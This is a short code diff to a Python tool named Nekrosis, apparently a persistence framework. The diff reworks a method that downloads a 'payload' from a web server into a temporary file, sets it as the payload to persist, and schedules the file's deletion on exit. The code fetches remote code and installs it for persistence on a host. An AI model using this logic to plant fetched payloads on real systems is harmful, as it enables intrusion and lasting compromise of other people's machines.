@@ -7,10 +7,12 @@ or as a standalone application through the main() function.
 
 import os
 import sys
+import atexit
 import ctypes
 import logging
 import argparse
 import requests
+import tempfile
 
 from pathlib import Path
 
@@ -175,19 +177,21 @@ class Nekrosis:
         self._payload = payload
         self.persistence_obj.payload = payload
 
-    def download_payload(self, payload: str) -> bool:
+    def download_payload(self, url: str) -> bool:
         """
-        Download the payload from a webserver
+        Download the payload from a web server
         """
         try:
-            response = requests.get(payload)
+            response = requests.get(url, timeout=5)
             if response.status_code == 200:
-                with open("download", "wb") as f:
+                file = tempfile.mktemp()
+                with open(file, "wb") as f:
                     f.write(response.content)
-                logging.info("Payload downloaded successfully.")
+                logging.info(f"Payload successfully downloaded to: {file}")
 
-                self._payload = payload
-                self.persistence_obj.payload = payload
+                self.change_payload(file)
+                atexit.register(os.remove, file)
+
                 return True
             else:
                 logging.error(f"Failed to download payload. Status code: {response.status_code}")
@@ -275,7 +279,7 @@ def main():
         "-p",
         "--payload",
         action="store",
-        help="The payload to install. This can either be a local file or one from a webserver"
+        help="The payload to install. This can either be a local file or one from a web server"
     )
     parser.add_argument(
         "-m",
